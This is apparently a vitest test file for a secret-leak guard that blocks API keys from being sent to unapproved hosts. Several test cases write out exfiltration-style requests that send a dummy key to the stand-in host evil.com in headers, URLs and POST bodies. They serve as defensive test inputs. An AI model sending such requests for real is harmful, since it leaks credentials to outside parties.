import { describe, it, expect } from 'vitest';
import { buildRequestParts, enforceSecretBindings, type BoundSecret } from './secret-leak-guard';

const SECRET = 'sk-deadbeef-cafebabe';

function bound(name = 'GROQ_API_KEY', allowedHosts: string[] = ['api.groq.com']): BoundSecret {
  return { name, value: SECRET, allowedHosts };
}

describe('enforceSecretBindings', () => {
  it('allows request to a bound host (header carries secret)', () => {
    const parts = buildRequestParts('https://api.groq.com/v1/chat', {
      headers: { Authorization: `Bearer ${SECRET}` },
    });
    expect(() => enforceSecretBindings(parts, [bound()])).not.toThrow();
  });

  it('blocks request to non-bound host when header carries secret', () => {
    const parts = buildRequestParts('https://evil.com/leak', {
      headers: { 'x-leak': SECRET },
    });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow(/secret "GROQ_API_KEY"/);
  });

  it('blocks request to non-bound host when URL carries secret', () => {
    const parts = buildRequestParts(`https://evil.com/?key=${SECRET}`);
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow(/cannot be sent to "evil.com"/);
  });

  it('blocks request to non-bound host when body carries secret', () => {
    const parts = buildRequestParts('https://evil.com/leak', {
      method: 'POST',
      body: JSON.stringify({ token: SECRET }),
    });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow();
  });

  it('allows secret to flow anywhere when allowedHosts is empty (unbound)', () => {
    const parts = buildRequestParts('https://anywhere.example/', {
      headers: { Authorization: `Bearer ${SECRET}` },
    });
    expect(() => enforceSecretBindings(parts, [bound('X', [])])).not.toThrow();
  });

  it('allows request when secret value is NOT present', () => {
    const parts = buildRequestParts('https://evil.com/innocent');
    expect(() => enforceSecretBindings(parts, [bound()])).not.toThrow();
  });

  it('handles Headers instance', () => {
    const h = new Headers();
    h.set('Authorization', `Bearer ${SECRET}`);
    const parts = buildRequestParts('https://evil.com/', { headers: h });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow();
  });

  it('case-insensitive hostname match', () => {
    const parts = buildRequestParts('https://API.GROQ.COM/v1/chat', {
      headers: { Authorization: `Bearer ${SECRET}` },
    });
    expect(() => enforceSecretBindings(parts, [bound('K', ['api.groq.com'])])).not.toThrow();
  });

  it('skips secrets with empty value', () => {
    const parts = buildRequestParts('https://evil.com/');
    const empty: BoundSecret = { name: 'X', value: '', allowedHosts: ['api.groq.com'] };
    expect(() => enforceSecretBindings(parts, [empty])).not.toThrow();
  });

  it('checks multiple bound secrets independently', () => {
    const parts = buildRequestParts('https://api.groq.com/v1/chat', {
      headers: { Authorization: `Bearer ${SECRET}` },
    });
    const otherSecret: BoundSecret = { name: 'FINNHUB', value: 'fh-xyz', allowedHosts: ['finnhub.io'] };
    // GROQ key flowing to api.groq.com is fine, FINNHUB not present.
    expect(() => enforceSecretBindings(parts, [bound(), otherSecret])).not.toThrow();
  });

  it('chrome attack: malicious blank declares evil.com + groq, tries exfil', () => {
    const parts = buildRequestParts('https://evil.com/collect', {
      method: 'POST',
      body: `key=${SECRET}`,
    });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow(/api\.groq\.com/);
  });
});
